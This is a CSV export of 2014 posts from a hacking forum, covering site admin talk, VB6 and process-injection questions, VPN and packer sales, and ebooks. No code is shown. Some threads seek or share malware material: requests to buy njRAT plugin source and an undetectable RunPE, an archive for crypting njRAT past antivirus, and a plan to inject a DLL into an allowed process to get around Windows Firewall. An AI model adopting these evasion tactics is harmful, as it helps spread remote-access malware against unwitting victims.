subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
The storm is over - DashBoard - HackHound,the-storm-is-over,chamelephon,5/20/2014 0:00,We would be happy to make a donation to increase the infrastructural stability of HH.,Newbie
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,duyan13,5/20/2014 0:00,I think the very first RunPE Code ( I think it was a poc by some Chinese guy ) also relocates the image that is going to be injected ... nice explanation .,IntermediateMember
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,Tigerass,5/20/2014 0:00,I think the very first relocation code is older than the internet Yeah relocation is really an must. Especially back the days when there wasn't that much memory available.,Newbie
The storm is over - DashBoard - HackHound,the-storm-is-over,x58,5/20/2014 0:00,"We would be happy to make a donation to increase the infrastructural stability of HH. Well i already can tell you that we won't change back to Cloudflare if it's up to me to decide. As Cloudflare, 1. Sucks and causes problems with he board software (strange issue on some nodes e.g content not properly loading like style files, png's etc) 2. Cloudflare supports and helps bad people(carders ddosers, skiddies and so on), i personally won't pay them a penny 3. We have other better alternatives for this At this moment HackHound runs on a overkill server.. In the future we will probably downgrade to safe a lot of money. And might upgrade again when the activity rises again. You won't notice anything as the current activity isn't putting any big load on the server at all. Only when gay bots start to flood, but for this we also have a new solutions.",Advanced
The storm is over - DashBoard - HackHound,the-storm-is-over,Tigerass,5/20/2014 0:00,Where did he wrote he will only support if we use CF? This would seem VERY strange to me... Andy why should chamelephon be interested in the stability of HH?,Member
The storm is over - DashBoard - HackHound,the-storm-is-over,x58,5/20/2014 0:00,"Where did he wrote he will only support if we use CF? This would seem VERY strange to me... Not really, unless he's willing to donate 100+ US each month (nobody in the entire world will do this).. And i don't think so. Donations aren't good enough to pay the bills with. DDoS protection on the scale we need costs us 200+ US at least. So not many companies will stay left to make choice of but only the mainstream crap like Cloudflare, Incapsula etc. At least Incapsula doesn't seem too bad at all. Better than CF if you ask me but for this you pay a lot more. Andy why should chamelephon be interested in the stability of HH? Surprises me too! He only has two posts, and yet already cares about the community. Well he is free to donate, he should pm Ravage for the payment address, for now this would be BTC and WMU i guess (not sure).",Advanced
The storm is over - DashBoard - HackHound,the-storm-is-over,noh4t,5/20/2014 0:00,Use the script i sent you and then make iptable forward too the real server if you have problems anyway the setup atm seems fine good job admins,AdvancedMember
Before you post: Short introductions will be removed - Hello World - HackHound,before-you-post-short-introductions-will-be-removed,x58,5/22/2014 0:00,"Dear members, If you write a introduction of yourself in these forums here then please don't just write ""HI!!!"" (for example). Write something relative. And not just 4 characters. This is not a social network, please keep this in mind. Thank you!",Advanced
Practical Reverse Engineering - Ebooks - HackHound,practical-reverse-engineering,LeFF,5/22/2014 0:00,Attached Files Practical Reverse Engineering.pdf 4.57MB 86 downloads,Expert
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,veoloz,5/22/2014 0:00,What if have to inject managed code?,Beginner
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,Tigerass,5/22/2014 0:00,"What if have to inject managed code? What if I don't get what you wanna ask me? what is managed code? Never heard about... Edited by Tigerass, 22 May 2014 - 09:27 PM.",Newbie
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,LeFF,5/23/2014 0:00,What if have to inject managed code? what if it is a completely different thing...,Expert
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,OXYMORON,5/23/2014 0:00,"Hello, I have found this alternative InStr function coded by iCode but it looks like it cannot work in certain conditions such as: Please Login or Register to see this Hidden Content this will return ""0"" but when using the alternative function I'm getting an error message. I think it's mainly because this alternative function cannot work with Longs so I wondered if anyone could make it work with both Strings & Longs because here is how I am calling it: Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content",Member
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,Danyfirex,5/23/2014 0:00,"how fuck goint to work if you wanna pass a string instead a long :S PD: rewrite the code passing a variant. Edited by Danyfirex, 23 May 2014 - 11:13 PM.",IntermediateMember
BattleField 4 - Gaming - HackHound,battlefield-4,Dunkin64,5/24/2014 0:00,I don't think you should buy BF4. BF3 is better in my opinion and you should be able to get it for much cheaper. I hate using Origin though..,Newbie
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,iCode,5/24/2014 0:00,"The problem is that you're trying to pass the starting position to the first parameter when my alternative clearly takes the start position as the third parameter. You're also going to be passing a string variable where a long variable would be required... You're receiving an error because you're lazy and didn't bother to actually look at the code and read the error message. Instead you just copied + pasted and are wondering why it doesn't work. Runtime Error 13 - Type Mismatch What do you think this means? Clearly that there's a variable type mismatch since you're passing a wrong parameter type. ByVal Start As Long = 1 Maybe for now on I'll make my functions with parameters in different orders and variable types and see how many of these threads pop up... Edited by iCode, 24 May 2014 - 10:54 AM.",AdvancedMember
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,OXYMORON,5/24/2014 0:00,"Sorry I didn't know the actual order of the original function... I have replaced my code as you have told me: Please Login or Register to see this Hidden Content But it is not returning the right value... The original function will return ""0"" whereas the alternative function will return ""21"" with this example: Please Login or Register to see this Hidden Content I have actually looked at the code but I don't have that much knowledge... Sorry for that iCode but thanks for trying to help, appreciated.",Member
how can i use C/C++ shellcode in my vb6 project? - General Discussion - HackHound,how-can-i-use-cc-shellcode-in-my-vb6-project,z00fle,5/24/2014 0:00,"hi, i want to use shellcode from here: Please Login or Register to see this Hidden Content in my vb6 project how can i do this? i follow sonykuccios guide but dont know enough",Member
how can i use C/C++ shellcode in my vb6 project? - General Discussion - HackHound,how-can-i-use-cc-shellcode-in-my-vb6-project,testacc,5/24/2014 0:00,"hi, i want to use shellcode from here: Please Login or Register to see this Hidden Content in my vb6 project how can i do this? i follow sonykuccios guide but dont know enough Of course you can. I don't know about VB6 a lot, but you just need to port this prototype: Please Login or Register to see this Hidden Content to VB6, so it looks similar to this (pseudocode): Please Login or Register to see this Hidden Content .. My post probably didn't help you at all, but the main idea is that you port the prototype to VB6 syntax and do",IntermediateMember
twGrabber - Malware Samples - HackHound,twgrabber,Rant,5/25/2014 0:00,You don't have experience with Good luck,Newbie
SecureVPN.to - New VPN Service - Flea Market - HackHound,securevpnto-new-vpn-service,Pongi,5/25/2014 0:00,"We welcome you to our Non Logging Privacy Service! Our ambition is to offer you a secure and anonymous way to protect your privacy. With our service, all data transmitted over the internet gets encrypted and tunneled through our secure non logging servers. On this way we hide your real identity and protect you from hackers and insecure networks. Even internet restrictions and censorship can be bypassed. Unlike other providers, we picked the fastest and most secure server locations available. Each server is highly protected and supports the most important protocols. Using our service is very easy due to our helpful tutorials available for Windows, Linux, Mac OS, Android and iOS. All of this can be ordered via your favourite anonymous payment method. Please have a look at the FAQ for additional information and contact us if there are any questions left. --------------------------------------------------------------------------------------------------------------------------------------------- FAQ's: Do you log ANY sensitive Information? We do not log your IP, the source or destination of your traffic or any other individually identifying information. Since we do not log anything, we have no information to share with any authority. Is there a bandwith or connection limit? We do not limit the speed or bandwidth and you are allowed to connect from all of your devices to all of our servers. Please keep in mind that you are not the only one using our service. Which payment options do you offer? We are offering a wide range of anonymous payment methods: Automated: Bitcoin, Litecoin, Feathercoin, Worldcoin, Dogecoin, Megacoin, EgoPay, Perfect Money Manual (may take up to 24 hours): Paysafecard, Ukash More can be found on our website: www.securevpn.to Edited by BullDog, 05 August 2014 - 12:10 PM. changed author",Member
"anyone wanna play a game? mmorpg,fps... - Gaming - HackHound",anyone-wanna-play-a-game-mmorpgfps,acdchris,5/26/2014 0:00,Does anyone have a steam account? PM me,Newbie
I want to buy njRAT dll plugin source code I pay 50 - 250 usd - Flea Market - HackHound,i-want-to-buy-njrat-dll-plugin-source-code-i-pay-50-250-usd,karakazan,5/26/2014 0:00,"Hi all I want to buy njRAT 5.0 dll plugin source code who have it or who decompiled dll source code I want to buy P.M Please. skype : davis.morted Edited by karakazan, 26 May 2014 - 12:37 PM.",Newbie
I want to buy njRAT dll plugin source code I pay 50 - 250 usd - Flea Market - HackHound,i-want-to-buy-njrat-dll-plugin-source-code-i-pay-50-250-usd,rabinat0r,5/26/2014 0:00,,IntermediateMember
I want to buy njRAT dll plugin source code I pay 50 - 250 usd - Flea Market - HackHound,i-want-to-buy-njrat-dll-plugin-source-code-i-pay-50-250-usd,Tigerass,5/26/2014 0:00,"I'm only doing business over facebook and paypal. PM me your facebook, then we can talk about the prize. for just talking: skype: kareem.alex1",Newbie
I want to buy njRAT dll plugin source code I pay 50 - 250 usd - Flea Market - HackHound,i-want-to-buy-njrat-dll-plugin-source-code-i-pay-50-250-usd,rabinat0r,5/26/2014 0:00,"I'm only doing business over facebook and paypal. PM me your facebook, then we can talk about the prize. for just talking: skype: kareem.alex1 HAHHAHAHAHAHAHAHHAHAHAHAHAHHAAHA SHEEEEIT i fucking spat my beer on the screen hahahahaha Edited by rabinat0r, 26 May 2014 - 05:18 PM.",IntermediateMember
"[PT] ospf routing assignment - Networking, Firewalls, Routers and Switches - HackHound",pt-ospf-routing-assignment,faster007,5/26/2014 0:00,"am quiet confused about how u did your VLSM because i taught the main concept behind VLSM is to prevent wasting of IP address , the reason why am asking this is that why did you assign the networks of the WAN links a subnet of /26 whiles you could make it /30 which will get you 4 ip address and 2 valid host which can take care of the WAN links between 2 routers kindly check the Image if am quiet wrong",Newbie
[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,Defalt,5/27/2014 0:00,"Looks useful, bookmarked.",Newbie
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,iCode,5/27/2014 0:00,"Because you're looking for ""IjHsMqZiEp"" inside """" at position 21... of course you're going to return 0...",AdvancedMember
The Rootkit Arsenal Second Edition - Ebooks - HackHound,the-rootkit-arsenal-second-edition,nemo,5/27/2014 0:00,If it says cannot view hidden content what does that mean? Aside from the middle finger of course,Newbie
FUD c++ RunPE - Flea Market - HackHound,fud-c-runpe,DarkDwarf,5/27/2014 0:00,"Hi, i want to buy a FUD c++ runPE. Make me an offer via PM or here in the Thread. I pay with BTC greetings",Member
"[PT] ospf routing assignment - Networking, Firewalls, Routers and Switches - HackHound",pt-ospf-routing-assignment,x58,5/27/2014 0:00,"am quiet confused about how u did your VLSM because i taught the main concept behind VLSM is to prevent wasting of IP address , the reason why am asking this is that why did you assign the networks of the WAN links a subnet of /26 whiles you could make it /30 which will get you 4 ip address and 2 valid host which can take care of the WAN links between 2 routers kindly check the Image if am quiet wrong You're right about that but, the assignment was to do it like this. Of course it could be done better, that's true.",Advanced
SecureVPN.to - New VPN Service - Flea Market - HackHound,securevpnto-new-vpn-service,rabinat0r,5/28/2014 0:00,"Today we bought new servers. Sweden (100 mBit), Ukraine (100 mBit) und Bulgaria (100 mBit). We hope to see them online soon",IntermediateMember
The storm is over - DashBoard - HackHound,the-storm-is-over,noobdan,5/28/2014 0:00,How about https://ddos-guard.net/en insted of cloudflare?,Newbie
Secure - Anonymous VPN Service - Flea Market - HackHound,secure-anonymous-vpn-service,Sh4DoVV,5/28/2014 0:00,"Hi I'm proud to present our vpn services here (Real Anonymous VPN with AES 256 Traffic Encryption) our vpn services is better than other one in 4 points 1.less price 2.more security (AES 256 Encryption) 3.Unlimited Bandwidth (Download How many you can) 4.No Reconnect Needed (Stay Always Connected) If you interested in test account please pm me Servers : Canada,USA,UK,Germany,France,Italy,Span Connection Methods : Kerio VPN Client , Https Proxy ( Such as proxifier ) Prices : 3 Month + 2 Week Free : 15 USD 6 Month + 3 Week Free : 20 USD 1-Year + 2 Month Free : 40 USD How to buy : Please Pay VPN Service price to our BitCoin Address and PM Me that contain payment information and valid email address to send you username/password all of this was done about 5 min after payment BitCoin Address : 17XVc4rE14vYVEDWz6NK5szwPJde5DtDfR Thanks. Edited by Sh4DoVV, 28 May 2014 - 03:53 PM.",Beginner
The storm is over - DashBoard - HackHound,the-storm-is-over,x58,5/28/2014 0:00,"How about https://ddos-guard.net/en insted of cloudflare? I've heard many good things about them. TF is also using ddos-guard because they also got flooded by a lot kids. They haven't been offline ever since using ddos-guard, well not for weeks anymore as in the past. But our problem is mainly the price of this reverse proxy / load balancer. It just costs quite some money you know. Cloudflare is of the list, not going to use that anymore unless we really have no other choice..",Advanced
Secure - Anonymous VPN Service - Flea Market - HackHound,secure-anonymous-vpn-service,rabinat0r,5/28/2014 0:00,"No Site? How can i be sure that you won't hand out any data? Are you a registered company or a bunch of guys fighting for freedom? Canada,USA,UK,Germany,France,Italy,Spain then you say: our vpn services is better than other one in 4 points uhm k. there are about 2390142640924 VPN providers i know (even HideMyButt) with that so called ""special features""..",IntermediateMember
Secure - Anonymous VPN Service - Flea Market - HackHound,secure-anonymous-vpn-service,Sh4DoVV,5/28/2014 0:00,"Thanks for your advices no at this time there is no site but very soon i will upload website there is no insurance for data logging and any vpn provider can log data , but i just fight for freedom and want to defeat internet censor ( like iran , china Internet Filtering ) and there is no log not because of my service is good , it's because of i hurt from internet filtering so i made a decision to provide good and secure vpn with low price to make possible to any one have an alternative way to surf internet without any looking eye",Beginner
Sell Source Code - Artan Lite Protector - Flea Market - HackHound,sell-source-code-artan-lite-protector,Sh4DoVV,5/28/2014 0:00,"Artan Lite Protector is Limited Version of Artan Win32 Protector that some options has been disabled and soled with lower price , there is no Virtualization and Obfuscation methods but here we have Nanomits Protection , Like Armadillo but a bit stronger because armadillo just simulate Jump Op-codes and Artan Simulate Jumps plus Call Op-codes that this make unpacking a little bit difficult in Full Version we have : Supporting All Native Files ( Like C++,Delphi,VB and etc ). Debug-Block Protection ( Anti-Attach ). Anti-Debugger Protection. Anti-Dump Protection. API-Redirection. OEP Protection. Code Marker to Select Sensitive Area for Deep Nanomits Protection. Simulating jmp,call,jnz,je Op-codes via Nanomits. MultiPack Support (Compatible with Other Packers such as UPX). Compatible with Windows XP to 8,8.1 ( x86 , x64 ) Hi I want sell artan lite protector source code , it is developed in delphi 2007 ,also i will provide full components i used in artan lite protector to vendee ; with Purchasing this source code you can have your own protection system Price of Full Source Code : 200 USD Payment just available in bitcoin My BitCoin Address : 17XVc4rE14vYVEDWz6NK5szwPJde5DtDfR Thanks",Beginner
ebooks collection - Ebooks - HackHound,ebooks-collection,ps-axl,5/28/2014 0:00,"Hello HackHound, I would like to share our ebook collection with you. You have direct link to ebooks, whitout crap like spam/ and other shits like that. There are currently 463 books in our system. https://hackyard.net/ebook",Beginner
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,OXYMORON,5/28/2014 0:00,"Because you're looking for ""IjHsMqZiEp"" inside """" at position 21... of course you're going to return 0... Yeah but your function won't return 0, it will return 21 which is false.. So, I had to add this at the end of the code so it will return the right value but I'm sure we can do it a different way cause this way can get tons of counterfeits... Please Login or Register to see this Hidden Content",Member
What exactly is an ebook? - Ebooks - HackHound,what-exactly-is-an-ebook,CunningCabbage,5/29/2014 0:00,I'm not sure.,Newbie
Any nice graphic art related to gaming? - General Discussion - HackHound,any-nice-graphic-art-related-to-gaming,CunningCabbage,5/29/2014 0:00,I'm searching for a good designer.,Newbie
Any nice graphic art related to gaming? - General Discussion - HackHound,any-nice-graphic-art-related-to-gaming,rabinat0r,5/29/2014 0:00,"I did a few gameserver logos and user signature pics related to gaming (Crysis, CoD, BF,..) What you exactly looking for?",IntermediateMember
What exactly is an ebook? - Ebooks - HackHound,what-exactly-is-an-ebook,rabinat0r,5/29/2014 0:00,"Come on, nobody can be that dumb..are you posting to get your post count up? http://en.wikipedia.org/wiki/E-book",IntermediateMember
What exactly is an ebook? - Ebooks - HackHound,what-exactly-is-an-ebook,Ntoskrnl,5/29/2014 0:00,"An ebook is a book that doesn't require a publisher, due to this it is usually expensive and full of shit.",Banned
What exactly is an ebook? - Ebooks - HackHound,what-exactly-is-an-ebook,KitsuneAnii,5/29/2014 0:00,"every word that has an ""E"" on, has the meaning of ""electronic"" like E-mail (electronic mail) E-book Electronic Book",Newbie
Blackness-Rat-v16 (Vbnet-Source) - Resources - HackHound,blackness-rat-v16-vbnet-source,Elm0D,5/30/2014 0:00,let us see it man,Newbie
SecureVPN.to - New VPN Service - Flea Market - HackHound,securevpnto-new-vpn-service,rabinat0r,5/30/2014 0:00,Servers in Sweden and Bulgaria are now online!,IntermediateMember
Atrax Source - Flea Market - HackHound,atrax-source,larry hoover,5/30/2014 0:00,"gosh, i was about buying this and now it has been knocked off..........too bad",Newbie
twGrabber - Malware Samples - HackHound,twgrabber,decent,5/30/2014 0:00,"NoNh I'm getting this error from the setup file Parse error: syntax error, unexpected '[', expecting T_STRING or '(' in /home/onlymade/public_html/wp-includes/css/styles/css/setup.php on line 3 how do i fix this?",Newbie
Atrax Source - Flea Market - HackHound,atrax-source,x58,5/31/2014 0:00,"OP has sold the source, therefore topic locked.",Advanced
SecureVPN.to - New VPN Service - Flea Market - HackHound,securevpnto-new-vpn-service,rabinat0r,5/31/2014 0:00,reseller for that crap ? lol ! -- www.hidemyass.com,IntermediateMember
Kiddy tool - File analysis - HackHound,kiddy-tool,yoxd,6/1/2014 0:00,Hey can someone analyse this tool for me pls Please Login or Register to see this Hidden Content rdg packer detector says: Net Crypter (Heuristic Detection) Thanks,Newbie
Kiddy tool - File analysis - HackHound,kiddy-tool,x58,6/1/2014 0:00,"Seems to be clean the only thing it does that surprices me is this.. Connects to google (probably to check if you have a internet connection i guess..) Then when you finish the setup it tries to send information about your computer hardware (i guess or licensing) to a mailbox, but it fails to login the mailbox. Please Login or Register to see this Hidden Content The executable itself (not the installer) checks hxxp://uhlatcikmuuss.blogspot.de/p/ver.html Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content 22.88KB 0 downloads Edited by x58, 01 June 2014 - 02:20 PM.",Advanced
Kiddy tool - File analysis - HackHound,kiddy-tool,Tigerass,6/1/2014 0:00,"Whoever did this wasn't even able to speak proper german... ""Fertig stellen..."" wtf.",Member
Kiddy tool - File analysis - HackHound,kiddy-tool,x58,6/1/2014 0:00,"Whoever did this wasn't even able to speak proper german... ""Fertig stellen..."" wtf. It is made in .NET what to expect from this trash?",Advanced
Kiddy tool - File analysis - HackHound,kiddy-tool,Tigerass,6/1/2014 0:00,It is made in .NET what to expect from this trash? It doesn't crash,Member
Kiddy tool - File analysis - HackHound,kiddy-tool,x58,6/1/2014 0:00,"It doesn't crash What crash? Where did you got this from, i don't understand you.",Advanced
[Service]               ***** Seo Website Ranking Service ***** - Flea Market - HackHound,service-seo-website-ranking-service,xxxadamxxx,6/1/2014 0:00,Has anyone tried this before ?? I am interested in the Facebook Fanpage likes. PM me please.,Newbie
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,iCode,6/2/2014 0:00,"Since you're incapable of altering a simple VB6 function... open your mouth cause here comes the airplane Please Login or Register to see this Hidden Content Edited by iCode, 02 June 2014 - 08:04 AM.",AdvancedMember
Sell Source Code - Artan Lite Protector - Flea Market - HackHound,sell-source-code-artan-lite-protector,Sh4DoVV,6/2/2014 0:00,"just for 20 june we have Discount , you can download demo version of artan lite protector from this topic price with Discount : 150 $ just for 20 june 2014 Thanks",Beginner
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,3rror4o4,6/2/2014 0:00,"Those are the tools you will need to avoid detection without using any crypter Archive contains: 1) DEV-POINT Junk Code Generator By hacker dz 2) Dll RunPe Encrypte By ıllıllıMя.HackeяsDzıllıllı 3) EntryPoint Generator By ıllıllıMя.HackeяsDzıllıllı 4) HEX2Byte Gen 5) Junk Gen 6) Rahoz RunPe Generator 7) VB.net RunPe Generator 2014 By ıllıllıMя.HackeяsDzıllıllı 8) VB.NET Code Source Generator Tools V 3.5 By ıllıllıMя.HackeяsDzıllıllı 9) VB.NET File To Hex By Rahoz P.s You will need Microsoft V.B to compile Attached Files crypting Nj-Rat.zip 3.31MB 113 downloads Edited by 3rror4o4, 02 June 2014 - 05:04 PM.",Member
PortEx - Java-Library for Static Analysis of PE Files - Team Projects - HackHound,portex-java-library-for-static-analysis-of-pe-files,Deque,6/2/2014 0:00,"Recent update includes a PE visualizer, which is a class that creates a buffered image based on the PE file structure. Example output for ntdll.dll:",IntermediateMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,x58,6/2/2014 0:00,"fyi, tools seems to be clean. However i think generating junk work help at all (maybe on static scan time detection, not runtime), but well. I have said that over a million times now. Idgf.",Advanced
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,3rror4o4,6/2/2014 0:00,"well, it's not FUD but easily bypasses most of them http://nodistribute..../pb5iA7nycGQWLX if u will play with code bit more, i belive u can make a fud one Edited by 3rror4o4, 02 June 2014 - 08:52 PM.",Member
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,Hacker4Life,6/2/2014 0:00,"Nice combo, thanks for sharing !!!!!!!!!!!! by XtremeHacker",IntermediateMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,Hacker4Life,6/3/2014 0:00,"Nodistribute, Eset shares files... You can get nice results, but FUD no..... only for some hours.... NOD 32 will detect..... NOD-IS-TRIBUTE.... Good results,... Personaly, I dont spend time doing a fud one for myself.... So many antivirus that nobody uses... lol..... Scan here m8, its from Razer, from UD TOOLS: http://fuckingscan.me/ by XtremeHacker",IntermediateMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,3rror4o4,6/3/2014 0:00,". Scan here m8, its from Razer, from UD TOOLS: http://fuckingscan.me/ by XtremeHacker Thanks Man ! bookmarked http://fuckingscan.me/ Edited by 3rror4o4, 03 June 2014 - 07:22 AM.",Member
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,rabinat0r,6/3/2014 0:00,"Nodistribute, Eset shares files... You can get nice results, but FUD no..... only for some hours.... NOD 32 will detect..... NOD-IS-TRIBUTE.... Good results,... Personaly, I dont spend time doing a fud one for myself.... So many antivirus that nobody uses... lol..... Scan here m8, its from Razer, from UD TOOLS: http://fuckingscan.me/ by XtremeHacker post proofs before you post shit.",IntermediateMember
BT5 wireless penetration testing [beginners guide] PDF - Ebooks - HackHound,bt5-wireless-penetration-testing-beginners-guide-pdf,Zambala,6/3/2014 0:00,i was looking for this type of e-book thank you so much ...,Newbie
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/3/2014 0:00,"As the title says, i would like to make a DLL in VB6 that i can inject into another process. So i understand i have to use a win32 dll, but how can i make one of these with vb6. I tried the tutorials on google at no avail. Please if anyone has a sample or something it would be awesome.",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/3/2014 0:00,Please Login or Register to see this Hidden Content /DLL /ENTRY:NewMain,AdvancedMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Danyfirex,6/3/2014 0:00,use C/C++/asm instead. Saludos,IntermediateMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/3/2014 0:00,"@Danyfirex: ""Need to make Win32 DLL in VB6"". I think the question is pretty clear. Let's try not to impose our preferences to another person. He didn't ask in what language is easier/better to code a native DLL...",AdvancedMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/3/2014 0:00,"Please Login or Register to see this Hidden Content /DLL /ENTRY:NewMain Is that all i need to modify, just the /Entry and compile from ActiveX DLL Project??",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/3/2014 0:00,"No, you need to compile as normal project but setting /DLL and /ENTRY:DllMain so the linker set the PE properly. You will have too some limitations. Take a look here: Please Login or Register to see this Hidden Content (read the 3 pages) If you use my linker most of the compile part is not need unless you need to make exports then things get a little harder.",AdvancedMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/3/2014 0:00,"No, you need to compile as normal project but setting /DLL and /ENTRY:DllMain so the linker set the PE properly. You will have too some limitations. Take a look here: Please Login or Register to see this Hidden Content (read the 3 pages) If you use my linker most of the compile part is not need unless you need to make exports then things get a little harder. Okay ill read through that, thanks for your help. Will i be able to inject this DLL into a process?",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/3/2014 0:00,"You will be able to inject the DLL but you *cannot* use MSVBVM60 functions. That is: no VB6 functions like InStr, Left, Right... Of course forget about PCODE. What are you trying to achieve? It may be easier for you to use other languages to create the DLL. Or even just do some code injection...",AdvancedMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/3/2014 0:00,"You will be able to inject the DLL but you *cannot* use MSVBVM60 functions. That is: no VB6 functions like InStr, Left, Right... Of course forget about PCODE. What are you trying to achieve? It may be easier for you to use other languages to create the DLL. Or even just do some code injection... Okay thanks for the heads up but i think i will be ok. What i am trying to do is... inject into a elevated process to disable or bypass windows firewall.",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/3/2014 0:00,You won't be able to inject yourself into an elevated process because you need to be in the same security level to do so...,AdvancedMember
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/4/2014 0:00,"You won't be able to inject yourself into an elevated process because you need to be in the same security level to do so... Right, ok. Gess that plan is out the window then! I guess ill have to find a application that is already aloud through windows firewall, then inject into that? Anyone got any good suggestions? Also i am still trying to do this just for the sake of getting it working. Injecting a C++ dll with a msgbox, works. Now injecting the DLL made with VB6, entry point DllMain like you said, and it doesn’t work. I tried also with and without a Def file, this also did not work at all. This is using KLinker. Im very confused, if someone can show me how to do this step by step, it would be really awesome! Hopefully i can get this done. Edited by karcrack, 04 June 2014 - 05:54 PM.",Member
"Encrypt HDD - Forensics, Data Destruction & Recovery - HackHound",encrypt-hdd,3rror4o4,6/4/2014 0:00,"Fellas Truecrypt isn't secure anymore. It used to be a my favorite one, but ---- http://truecrypt.sourceforge.net/ So for every truecrypt user, time to migrate . CompuSec is a good alternative, but doesn't supports win8 and up. Axcrypt is another good one and of course GnuPG. Your privacy,you decide which one to use.... regards, 3rror4o4",IntermediateMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,Hacker4Life,6/4/2014 0:00,"post proofs before you post shit. Look, when I say something, its because I know what I am talking about... so, not for you, but for all others in this forum, you are free to see and prove it yourself, in 15 minutes, if you feel clever.... When I dont know, I dont post and try to share my own knowledge, just by guessing.... The person that needs to check for proves isnt me, been there, done that, its you, and then you can tell who post shi"""""""""" And I repeat, I replyed you, not for you, but for all HH, I would never reply to you... but in this case, I did it... for HH, not for you....... by XtremeHacker",IntermediateMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,rabinat0r,6/4/2014 0:00,"You don't know shit, you just browsed skidforums and saw that a kid was crying about his shitty autoit $5 paypal crypter being detected by ESET after scanning on nodistribute..THIS DOES NOT PROOF ANYTHING.",IntermediateMember
